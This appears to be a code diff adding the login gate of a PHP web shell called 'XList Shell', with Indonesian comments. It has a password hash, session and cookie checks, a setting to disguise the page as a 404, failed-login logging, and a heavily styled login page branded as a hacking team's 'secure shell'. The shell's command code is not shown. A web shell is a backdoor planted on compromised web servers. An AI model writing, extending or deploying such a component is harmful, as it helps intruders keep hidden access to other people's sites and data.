@@ -1,0 +1,603 @@
+<?php
+
+$GLOBALS['./XList'] = array(
+    'username' => './XList',
+    'password' => '$2a$12$1RYckKQhXuuq0GLmcTn9V.FDFW.RD830a5fi9LS1HztlMiHYMkPEm',
+    'safe_mode' => '0',
+    'login_page' => '404',
+    'show_icons' => '1',
+    'post_encryption' => false,
+    'cgi_api' => true,
+);
+
+// ==================== FITUR LOGIN CLASSIC SOFT ====================
+define('LOGIN_PASS_HASH', '$2a$12$.BvXhKulwsYi7tGoRVolb.khvghyf.O9MPiC2NkdyAL8m4IVLtoBa');
+
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
+if (!isset($_SESSION['xlist_logged']) || $_SESSION['xlist_logged'] !== true) {
+    if (isset($_COOKIE['xlist_auth'])) {
+        if (password_verify($_COOKIE['xlist_auth'] . 'xlist', LOGIN_PASS_HASH)) {
+            $_SESSION['xlist_logged'] = true;
+        }
+    }
+    
+    if (!isset($_SESSION['xlist_logged']) || $_SESSION['xlist_logged'] !== true) {
+        if (isset($_POST['login_pass']) && !empty($_POST['login_pass'])) {
+            $input_pass = trim($_POST['login_pass']);
+            
+            if (password_verify($input_pass, LOGIN_PASS_HASH)) {
+                $_SESSION['xlist_logged'] = true;
+                $cookie_hash = password_hash($input_pass . 'xlist', PASSWORD_BCRYPT);
+                setcookie('xlist_auth', $cookie_hash, time() + (86400 * 7), '/');
+                header('Location: ' . $_SERVER['PHP_SELF']);
+                exit;
+            } else {
+                $login_error = '⚠️ Invalid password. Please try again.';
+                @file_put_contents('login_attempts.log', date('Y-m-d H:i:s') . ' - IP: ' . $_SERVER['REMOTE_ADDR'] . ' - Failed' . "\n", FILE_APPEND);
+            }
+        }
+        
+        // TAMPILAN LOGIN CLASSIC SOFT DENGAN GIF KEREN
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>XList Shell - Secure Login</title>
+            <meta charset="UTF-8">
+            <style>
+                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+                
+                * { margin:0; padding:0; box-sizing:border-box; }
+                
+                body {
+                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    overflow: hidden;
+                    background: #0c0e14;
+                }
+                
+                /* BACKGROUND GAMBAR DENGAN ANIMASI ROBOT DAN TEMBAKAN */
+                .bg-container {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    z-index: 0;
+                }
+                
+                .bg-container::before {
+                    content: '';
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvtRFz82AY4DNpGZO_2yietkuqlcK9BMIlAu4fp8bHSsKAgRhW43htTPeCe00WRnPixc2C8jjmBSueRwZfcnYII-4kyFflnPmG0KrofG63Nd9LLoOj4i040K2i-MvsPx8jQn0_UPtdGEPl4XMKU1eIahThMcI6dZVFuQxMJ_fNEcMdZQ018yRfJtNlRUod/s1672/d142523a-8197-4af7-8310-52e32a69df44.gif') no-repeat center center/cover;
+                    opacity: 0.25;
+                    animation: slowZoom 30s ease-in-out infinite alternate;
+                }
+                
+                /* EFEK ROBOT BERGERAK DI ATAS BACKGROUND */
+                .robot-overlay {
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    pointer-events: none;
+                    z-index: 1;
+                    background: url('https://i.gifer.com/origin/7a/7ad78f36a805cb8afe2dbe448a0f1f9c_w200.gif') no-repeat bottom left;
+                    background-size: 200px;
+                    opacity: 0.15;
+                    animation: robotMove 20s ease-in-out infinite alternate;
+                }
+                
+                /* EFEK TEMBAKAN LASER */
+                .laser-effect {
+                    position: absolute;
+                    top: 50%;
+                    left: 0;
+                    width: 100%;
+                    height: 4px;
+                    background: linear-gradient(90deg, transparent, #00ff00, #ff0000, transparent);
+                    opacity: 0;
+                    animation: laserShot 3s ease-in-out infinite;
+                    z-index: 1;
+                    pointer-events: none;
+                }
+                
+                .laser-effect:nth-child(2) {
+                    top: 30%;
+                    animation-delay: 1s;
+                }
+                
+                .laser-effect:nth-child(3) {
+                    top: 70%;
+                    animation-delay: 2s;
+                }
+                
+                /* PARTIKEL TEMBAKAN */
+                .particle-container {
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    pointer-events: none;
+                    z-index: 1;
+                    overflow: hidden;
+                }
+                
+                .particle {
+                    position: absolute;
+                    width: 6px;
+                    height: 6px;
+                    background: #ff4444;
+                    border-radius: 50%;
+                    box-shadow: 0 0 10px #ff4444, 0 0 20px #ff8800;
+                    animation: particleFly 4s linear infinite;
+                }
+                
+                .particle:nth-child(1) { left: 10%; animation-delay: 0s; }
+                .particle:nth-child(2) { left: 30%; animation-delay: 1.2s; }
+                .particle:nth-child(3) { left: 50%; animation-delay: 2.4s; }
+                .particle:nth-child(4) { left: 70%; animation-delay: 0.8s; }
+                .particle:nth-child(5) { left: 90%; animation-delay: 1.8s; }
+                .particle:nth-child(6) { left: 20%; animation-delay: 3.2s; }
+                .particle:nth-child(7) { left: 60%; animation-delay: 0.5s; }
+                .particle:nth-child(8) { left: 80%; animation-delay: 2.9s; }
+                
+                @keyframes particleFly {
+                    0% { transform: translateY(100vh) scale(0); opacity: 1; }
+                    50% { transform: translateY(50vh) scale(1.5); opacity: 0.8; }
+                    100% { transform: translateY(-10vh) scale(0.5); opacity: 0; }
+                }
+                
+                @keyframes robotMove {
+                    0% { transform: translateX(-50px) scale(0.8); }
+                    50% { transform: translateX(calc(100vw - 250px)) scale(1.2); }
+                    100% { transform: translateX(-50px) scale(0.8); }
+                }
+                
+                @keyframes laserShot {
+                    0% { opacity: 0; transform: scaleX(0); transform-origin: left; }
+                    20% { opacity: 1; transform: scaleX(1); transform-origin: left; }
+                    80% { opacity: 1; transform: scaleX(1); transform-origin: right; }
+                    100% { opacity: 0; transform: scaleX(0); transform-origin: right; }
+                }
+                
+                @keyframes slowZoom {
+                    0% { transform: scale(1); }
+                    100% { transform: scale(1.06); }
+                }
+                
+                .bg-container::after {
+                    content: '';
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: 
+                        radial-gradient(ellipse at 30% 50%, rgba(100,150,255,0.04) 0%, transparent 60%),
+                        radial-gradient(ellipse at 70% 50%, rgba(200,180,255,0.03) 0%, transparent 60%),
+                        linear-gradient(180deg, rgba(12,14,20,0.8) 0%, rgba(12,14,20,0.6) 100%);
+                }
+                
+                .login-wrapper {
+                    position: relative;
+                    z-index: 2;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    width: 100%;
+                    padding: 20px;
+                }
+                
+                .login-card {
+                    background: rgba(18, 20, 28, 0.92);
+                    backdrop-filter: blur(24px);
+                    border: 1px solid rgba(255,255,255,0.06);
+                    border-radius: 20px;
+                    padding: 48px 44px 38px;
+                    max-width: 400px;
+                    width: 100%;
+                    box-shadow: 
+                        0 25px 80px rgba(0,0,0,0.6),
+                        0 0 0 1px rgba(255,255,255,0.02) inset;
+                    animation: fadeIn 0.8s ease-out;
+                }
+                
+                @keyframes fadeIn {
+                    0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+                    100% { opacity: 1; transform: translateY(0) scale(1); }
+                }
+                
+                /* LOGO DENGAN ANIMASI */
+                .login-logo {
+                    text-align: center;
+                    margin-bottom: 32px;
+                }
+                
+                .login-logo .icon {
+                    font-size: 36px;
+                    display: block;
+                    margin-bottom: 8px;
+                    color: #c8d0e0;
+                    animation: iconPulse 2s ease-in-out infinite;
+                }
+                
+                @keyframes iconPulse {
+                    0%, 100% { transform: scale(1) rotate(0deg); }
+                    25% { transform: scale(1.1) rotate(-5deg); }
+                    75% { transform: scale(1.1) rotate(5deg); }
+                }
+                
+                /* GIF KECIL DI LOGO */
+                .logo-gif {
+                    width: 60px;
+                    height: 60px;
+                    margin: 0 auto 10px;
+                    display: block;
+                    border-radius: 50%;
+                    border: 2px solid rgba(255,255,255,0.1);
+                    animation: glowPulse 2s ease-in-out infinite;
+                }
+                
+                @keyframes glowPulse {
+                    0%, 100% { box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+                    50% { box-shadow: 0 0 40px rgba(0,255,0,0.3); }
+                }
+                
+                .login-logo h1 {
+                    font-size: 20px;
+                    font-weight: 600;
+                    color: #e8edf5;
+                    letter-spacing: 3px;
+                }
+                
+                .login-logo h1 span {
+                    color: #8a9bb5;
+                    font-weight: 300;
+                }
+                
+                .login-logo .subtitle {
+                    font-size: 12px;
+                    color: #5a6a80;
+                    letter-spacing: 4px;
+                    margin-top: 4px;
+                    font-weight: 300;
+                }
+                
+                .login-logo .divider {
+                    width: 50px;
+                    height: 2px;
+                    background: linear-gradient(90deg, transparent, rgba(200,210,230,0.15), transparent);
+                    margin: 12px auto 0;
+                }
+                
+                /* STATUS */
+                .status-bar {
+                    text-align: center;
+                    font-size: 11px;
+                    color: rgba(255,255,255,0.15);
+                    font-weight: 300;
+                    margin-bottom: 28px;
+                    letter-spacing: 2px;
+                }
+                
+                .status-bar .dot {
+                    display: inline-block;
+                    width: 6px;
+                    height: 6px;
+                    background: #5a8a8a;
+                    border-radius: 50%;
+                    margin-right: 8px;
+                    animation: pulse 2s infinite;
+                }
+                
+                @keyframes pulse {
+                    0%, 100% { opacity: 0.4; transform: scale(1); }
+                    50% { opacity: 1; transform: scale(1.5); background: #00ff00; }
+                }
+                
+                /* INPUT */
+                .input-group {
+                    margin-bottom: 22px;
+                }
+                
+                .input-group label {
+                    display: block;
+                    font-size: 11px;
+                    font-weight: 500;
+                    color: rgba(255,255,255,0.25);
+                    letter-spacing: 2px;
+                    text-transform: uppercase;
+                    margin-bottom: 8px;
+                }
+                
+                .input-group .input-wrap {
+                    position: relative;
+                }
+                
+                .input-group .input-wrap .icon {
+                    position: absolute;
+                    left: 14px;
+                    top: 50%;
+                    transform: translateY(-50%);
+                    font-size: 16px;
+                    color: rgba(255,255,255,0.08);
+                    transition: color 0.3s;
+                }
+                
+                .input-group input {
+                    width: 100%;
+                    padding: 14px 16px 14px 46px;
+                    background: rgba(255,255,255,0.02);
+                    border: 1px solid rgba(255,255,255,0.04);
+                    border-radius: 12px;
+                    color: #d0d8e8;
+                    font-size: 16px;
+                    font-family: 'Inter', sans-serif;
+                    transition: all 0.3s ease;
+                    outline: none;
+                    letter-spacing: 2px;
+                }
+                
+                .input-group input:focus {
+                    border-color: rgba(200,210,230,0.12);
+                    background: rgba(255,255,255,0.03);
+                    box-shadow: 0 0 30px rgba(200,210,230,0.02);
+                }
+                
+                .input-group input:focus ~ .icon,
+                .input-group input:focus + .icon {
+                    color: rgba(200,210,230,0.2);
+                }
+                
+                .input-group input::placeholder {
+                    color: rgba(255,255,255,0.06);
+                    font-size: 13px;
+                    font-weight: 300;
+                    letter-spacing: 1px;
+                }
+                
+                /* BUTTON */
+                .btn-login {
+                    width: 100%;
+                    padding: 15px;
+                    background: rgba(255,255,255,0.02);
+                    border: 1px solid rgba(255,255,255,0.04);
+                    border-radius: 12px;
+                    color: #b8c5d8;
+                    font-family: 'Inter', sans-serif;
+                    font-size: 13px;
+                    font-weight: 500;
+                    letter-spacing: 3px;
+                    cursor: pointer;
+                    transition: all 0.4s ease;
+                    text-transform: uppercase;
+                    position: relative;
+                    overflow: hidden;
+                }
+                
+                .btn-login::before {
+                    content: '';
+                    position: absolute;
+                    top: -50%;
+                    left: -50%;
+                    width: 200%;
+                    height: 200%;
+                    background: linear-gradient(45deg, transparent, rgba(0,255,0,0.05), transparent);
+                    animation: btnShine 3s linear infinite;
+                }
+                
+                @keyframes btnShine {
+                    0% { transform: rotate(0deg) translateX(-100%); }
+                    100% { transform: rotate(360deg) translateX(100%); }
+                }
+                
+                .btn-login:hover {
+                    background: rgba(255,255,255,0.04);
+                    border-color: rgba(255,255,255,0.08);
+                    color: #e8edf5;
+                    box-shadow: 0 0 30px rgba(200,210,230,0.02), 0 0 60px rgba(0,255,0,0.05);
+                }
+                
+                .btn-login:active {
+                    transform: scale(0.98);
+                }
+                
+                /* ERROR */
+                .error-msg {
+                    text-align: center;
+                    color: #c47a7a;
+                    font-size: 13px;
+                    font-weight: 400;
+                    margin-bottom: 20px;
+                    padding: 10px 14px;
+                    background: rgba(196,122,122,0.04);
+                    border: 1px solid rgba(196,122,122,0.06);
+                    border-radius: 10px;
+                    letter-spacing: 1px;
+                    animation: shake 0.5s ease-in-out;
+                }
+                
+                @keyframes shake {
+                    0%, 100% { transform: translateX(0); }
+                    20% { transform: translateX(-6px); }
+                    40% { transform: translateX(6px); }
+                    60% { transform: translateX(-6px); }
+                    80% { transform: translateX(6px); }
+                }
+                
+                /* FOOTER */
+                .login-footer {
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-top: 24px;
+                    font-size: 10px;
+                    color: rgba(255,255,255,0.06);
+                    letter-spacing: 2px;
+                }
+                
+                .login-footer .badge {
+                    display: flex;
+                    align-items: center;
+                    gap: 6px;
+                }
+                
+                .login-footer .badge .dot {
+                    display: inline-block;
+                    width: 4px;
+                    height: 4px;
+                    background: rgba(255,255,255,0.08);
+                    border-radius: 50%;
+                }
+                
+                .login-footer .version {
+                    color: rgba(255,255,255,0.04);
+                }
+                
+                /* SCANLINE */
+                .scanline-soft {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: repeating-linear-gradient(
+                        0deg,
+                        transparent,
+                        transparent 3px,
+                        rgba(255,255,255,0.008) 3px,
+                        rgba(255,255,255,0.008) 4px
+                    );
+                    pointer-events: none;
+                    z-index: 3;
+                }
+                
+                /* GLITCH EFFECT */
+                .glitch {
+                    animation: glitch 4s infinite;
+                }
+                
+                @keyframes glitch {
+                    0%, 90%, 100% { opacity: 1; }
+                    92% { opacity: 0.8; transform: translateX(-2px); }
+                    94% { opacity: 1; transform: translateX(2px); }
+                    96% { opacity: 0.6; transform: translateX(-1px); }
+                    98% { opacity: 1; transform: translateX(0); }
+                }
+                
+                /* RESPONSIVE */
+                @media (max-width: 480px) {
+                    .login-card {
+                        padding: 35px 24px 30px;
+                        border-radius: 16px;
+                    }
+                    .login-logo h1 {
+                        font-size: 17px;
+                    }
+                    .input-group input {
+                        font-size: 15px;
+                        padding: 13px 14px 13px 42px;
+                    }
+                    .btn-login {
+                        font-size: 12px;
+                        padding: 14px;
+                    }
+                    .robot-overlay { display: none; }
+                }
+            </style>
+        </head>
+        <body>
+            <div class="bg-container">
+                <!-- ROBOT OVERLAY -->
+                <div class="robot-overlay"></div>
+                
+                <!-- LASER EFFECTS -->
+                <div class="laser-effect"></div>
+                <div class="laser-effect"></div>
+                <div class="laser-effect"></div>
+                
+                <!-- PARTIKEL TEMBAKAN -->
+                <div class="particle-container">
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                    <div class="particle"></div>
+                </div>
+            </div>
+            <div class="scanline-soft"></div>
+            
+            <div class="login-wrapper">
+                <div class="login-card glitch">
+                    <div class="login-logo">
+                        <img class="logo-gif" src="https://i.gifer.com/origin/1d/1d5b9d1bfc303b5254f4b3c89722dd65_w200.gif" alt="XList">
+                        <span class="icon">◇</span>
+                        <h1>F<span>ucking Team!</span></h1>
+                        <div class="subtitle">● secure shell ●</div>
+                        <div class="divider"></div>
+                    </div>
+                    
+                    <div class="status-bar">
+                        <span class="dot"></span> system locked
+                    </div>
+                    
+                    <?php if (isset($login_error)): ?>
+                        <div class="error-msg">✕ <?php echo $login_error; ?></div>
+                    <?php endif; ?>
+                    
+                    <form method="post" autocomplete="off">
+                        <div class="input-group">
+                            <label>🔐 password</label>
+                            <div class="input-wrap">
+                                <input type="password" name="login_pass" placeholder="enter your password" autofocus>
+                                <span class="icon">⌘</span>
+                            </div>
+                        </div>
+                        
+                        <button type="submit" class="btn-login">↳ unlock</button>
+                    </form>
+                    
+                    <div class="login-footer">
+                        <span class="badge">
+                            <span class="dot"></span>
+                            <span>secure</span>
+                        </span>
+                        <span class="version">v<?php echo __XLIST_VERSION__; ?></span>
+                    </div>
+                </div>
+            </div>
+            
+            <script>
+                document.querySelector('input[name="login_pass"]').focus();
+                
+                document.querySelector('input[name="login_pass"]').addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        this.form.submit();
+                    }
+                });
+            </script>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+// ==================== AKHIR FITUR LOGIN ====================
+
+// ... REST OF YOUR ORIGINAL CODE CONTINUES UNCHANGED ...
